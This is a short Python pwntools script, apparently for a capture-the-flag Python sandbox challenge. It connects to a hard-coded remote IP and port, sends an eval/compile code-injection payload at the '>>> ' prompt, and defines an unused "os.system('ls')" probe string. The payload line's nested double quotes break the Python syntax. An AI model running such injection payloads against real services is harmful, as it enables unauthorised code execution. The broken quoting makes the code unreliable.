
from pwn import *

#retmote args
remote_host = "54.222.255.223"
remote_port = 50000

context.log_level = "debug"
io = remote(remote_host, remote_port)

ex_string = "os.system('ls')"

def msend_str(mcontent):
    io.recvuntil(">>> ")
    io.sendline(mcontent)

payload = "eval(compile('print "hello world"', '<stdin>', 'exec'))"
msend_str(payload)
